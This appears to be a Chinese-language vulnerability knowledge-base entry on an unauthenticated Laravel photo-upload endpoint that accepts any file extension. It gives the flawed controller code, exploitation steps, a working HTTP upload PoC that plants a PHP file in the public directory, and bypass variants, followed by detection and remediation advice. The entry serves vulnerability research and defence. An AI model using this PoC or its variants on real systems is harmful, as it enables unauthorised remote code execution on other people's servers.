---
id: web-generic-file-upload-laravel-unauth-uploadphoto-extension-webshell
title: Laravel 未鉴权图片上传接口扩展名零校验：原始后缀落盘 public 目录写入 PHP WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: laravel-unauthenticated-extension-upload-webshell
aliases:
- Laravel uploadPhoto 任意文件上传
- Laravel 前台文件上传 RCE
- 未鉴权 uploadPhoto
- getClientOriginalExtension 零校验
- public/uploads/photos webshell
tags:
- php
- laravel
- file-upload
- webshell
- extension-bypass
- unauthenticated
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:47:29+08:00'
  notes: 已对照原文及13张图核对：api.php 未登录区含 Route::post('uploadPhoto','TeachersController@uploadPhoto')；控制器源码与图11逐行一致（getClientOriginalExtension 转小写、空则png、time+rand 命名、public_path 下 move）；图12 Burp 上传 server1.php 得 200 与 data.url；图13 访问 URL 执行 phpinfo（PHP 7.4.25）。原文产品名打码、无版本区间，未设 versions。PoC 未在本机执行。
---

## 一句话结论

Laravel 后台系统的 API 路由把 `uploadPhoto` 放在无需 `auth:api` 的组里，控制器直接取 `$request->photo` 的原始扩展名（空则默认 `png`）、用“时间戳+随机数+后缀”命名后 `move()` 到 `public/uploads/photos/日期/`；由于没有任何扩展名白名单或内容校验，未登录攻击者上传 `server1.php` 即可在 Web 可访问目录落地 PHP WebShell 并直接执行。

## 原理

- **路由鉴权缺失**：`routes/api.php` 中部分路由（含 `Route::post('uploadPhoto', 'TeachersController@uploadPhoto')`）写在 `auth:api` 中间件组之外，属于无需登录的 API；攻击者直接调用即可。
- **扩展名零校验**：控制器：
  ```php
  $folder_name = '/uploads/photos/' . date("Y_m_d", time());
  $upload_path = public_path() . '/' . $folder_name;
  $extension = strtolower($file->getClientOriginalExtension()) ?: 'png';
  $filename = time() . rand(1111, 9999) . '.' . $extension;
  $file->move($upload_path, $filename);
  ```
  `getClientOriginalExtension()` 直接取客户端 multipart 文件名最后一个点后的内容并转小写，只做“空则 png”的兜底，没有任何白名单、MIME 检查、文件头校验或重编码。
- **落点可执行**：保存路径是 Laravel 的 `public/` 目录（`public_path()`），Web 服务器把 `.php` 请求交给 PHP-FPM，`move()` 落盘后文件即可通过返回的 `url` 访问执行。
- **为什么成立**：上传接口的安全边界应由“服务端决定扩展名/内容”与“存储位置不可执行”共同保证；这里两处都缺失——扩展名由客户端决定，存储目录又允许脚本执行。
- 原文环境为 PHP 7.4.25 + Laravel；上传 `phpinfo()` 后访问返回的 URL 成功执行。

## 触发条件

- 目标为 Laravel 系统，存在类似 `uploadPhoto` 的图片上传接口（原文产品名被打码，路径为 `/api/v1/uploadPhoto`）。
- 该路由未要求登录/鉴权（原文位于 api.php 的无需登录接口区）。
- 上传目录位于 `public/` 或 Web 可访问目录，且 Web 服务器会解析上传的后缀（PHP-FPM/Apache mod_php 等）。
- 服务端未对扩展名、MIME、文件头做白名单校验，也未对上传文件重编码。

## 利用步骤

1. 审计 `routes/api.php` / `routes/web.api`，找出未挂 `auth:api`/`auth.badmin` 中间件的上传路由；原文为 `POST /api/v1/uploadPhoto`。
2. 跟进控制器确认上传字段名（原文 `photo`）、保存目录与文件名生成逻辑，确认扩展名取自客户端且无白名单。
3. 构造 multipart 请求，`filename="server1.php"`，内容为 `<?php phpinfo(); ?>`。
4. 从 JSON 响应读取 `data.url`（形如 `/uploads/photos/2025_12_09/17652464861881.php`）。
5. 访问该 URL；若返回 PHP 执行结果（原文为 phpinfo 页面），说明 WebShell 已生效；再替换为命令执行/文件管理代码。

## PoC

```http
POST /api/v1/uploadPhoto HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNQ31g2CdKukagd4P

------WebKitFormBoundaryNQ31g2CdKukagd4P
Content-Disposition: form-data; name="photo"; filename="server1.php"
Content-Type: image/svg+xml

<?php phpinfo(); ?>
------WebKitFormBoundaryNQ31g2CdKukagd4P--
```

```json
{"data": {"url": "/uploads/photos/2025_12_09/17652464861881.php"}}
```

访问 `http://target/uploads/photos/2025_12_09/17652464861881.php` 即执行 `phpinfo()`。

## 变体与关联

- 变体：改用 `.phtml`、`.php5`、`.php7` 等仍被 PHP-FPM 解析的后缀；结合 `.htaccess` 让图片后缀被当作 PHP 解析；上传 SVG/HTML 做存储型 XSS；若目录名可控，尝试路径穿越改变落点（原文未涉及）。
- 关联：`[[web-generic-file-upload-extension-zero-check]]`（扩展名零校验 webshell 的通用形态）；`[[web-generic-file-upload-user-controlled-filename-webshell]]`（保留原始文件名写 WebShell）；`[[web-generic-file-upload-weak-suffix-bypass]]`（弱后缀校验）；`[[web-php-framework-yii2-uploadedfile-saveas-unfiltered]]`（同层 PHP 框架上传问题）。
- 与“后台任意文件上传”的区别：本场景的上传路由本身未鉴权，攻击者无需任何账号；危害直接从匿名访问到 RCE。

## 检测与防御

- 检测：`/api/v1/uploadPhoto` 等上传接口出现 `.php`/`.phtml`/`.php5` 后缀或 `Content-Type: image/svg+xml` 但内容含 PHP 标签；上传目录出现可执行脚本；对新落盘 PHP 文件的 Web 访问与异常子进程；响应返回的 URL 与实际文件类型不一致。
- 修复：服务端生成文件名并固定安全扩展名（如 `.jpg`），不信任客户端后缀；对图片重编码/校验文件头与 MIME；上传目录移出 Web 根或禁止脚本执行（Nginx `location ~ \.php$ { deny all; }`）；上传路由加入鉴权与权限校验。
- 缓解：WAF 拦截上传请求中的脚本后缀与 PHP 标签；限制上传目录权限；监控公开目录的新文件与访问日志。
